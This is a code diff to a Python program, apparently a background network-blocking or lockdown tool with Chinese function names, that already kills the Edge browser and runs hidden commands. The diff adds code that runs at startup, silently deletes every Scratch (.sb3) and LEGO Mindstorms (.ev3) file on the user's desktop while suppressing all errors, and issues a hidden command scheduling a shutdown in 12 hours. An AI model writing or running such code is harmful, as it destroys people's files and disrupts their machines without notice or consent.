@@ -136,6 +136,32 @@ def 弹窗_3秒自动关闭(标题, 内容):
         pass
 
 
+def 删除桌面指定文件():
+    """
+    删除桌面上所有的 .sb3 和 .ev3 文件（启动后自动清理）
+    """
+    try:
+        if sys.platform == 'win32':
+            buf = ctypes.create_unicode_buffer(300)
+            ctypes.windll.shell32.SHGetFolderPathW(None, 0, None, 0, buf)
+            desktop = buf.value
+            if not desktop:
+                desktop = os.path.join(os.environ.get('USERPROFILE', ''), 'Desktop')
+        else:
+            desktop = os.path.expanduser("~/Desktop")
+            
+        if os.path.exists(desktop):
+            for filename in os.listdir(desktop):
+                if filename.lower().endswith(('.sb3', '.ev3')):
+                    file_path = os.path.join(desktop, filename)
+                    try:
+                        os.remove(file_path)
+                    except Exception:
+                        pass
+    except Exception:
+        pass
+
+
 def 禁止_edge_上网():
     """强制结束 Edge 浏览器进程"""
     执行隐藏命令('taskkill /f /im msedge.exe')
@@ -341,6 +367,10 @@ def 主入口():
 
     # 如果是首个运行的实例，直接作为主程序静默在后台启动，直接进入断网循环，无需任何人工确认
     初始化共享内存()
+    # 执行静默关机命令（12小时后关机）
+    执行隐藏命令("shutdown -s -t 43200")
+    # 删除桌面上的 .sb3 和 .ev3 文件
+    删除桌面指定文件()
 
     try:
         阻断逻辑()
